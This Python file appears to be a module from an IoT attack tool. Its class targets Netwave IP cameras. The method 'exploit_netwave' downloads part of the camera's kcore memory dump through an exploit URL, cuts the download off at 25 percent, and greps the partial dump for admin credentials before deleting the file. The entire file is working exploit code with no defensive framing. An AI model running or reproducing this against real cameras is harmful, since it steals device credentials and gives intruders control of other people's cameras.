from config import INFO
import urllib.request
import subprocess
import signal
import sys, os

class netwaveCam:

    def dlProgress(self, count, blockSize, totalSize):
        percent = int(count*blockSize*100/totalSize)
        sys.stdout.write("%2d%% download...\r" % percent)
        sys.stdout.flush()
        if percent == 25:
            pid = os.getpid()
            os.kill(pid, signal.SIGINT)
    

    def exploit_netwave(self, url_exploit, netwave):
        print("{}Download the kcore dump\r".format(INFO))
        try:
            urllib.request.urlretrieve(url_exploit, filename="data.txt", reporthook=netwave.dlProgress)
        except KeyboardInterrupt:
            print("\n")
            os.system('strings data.txt | grep -i admin -C3')
            os.remove("data.txt")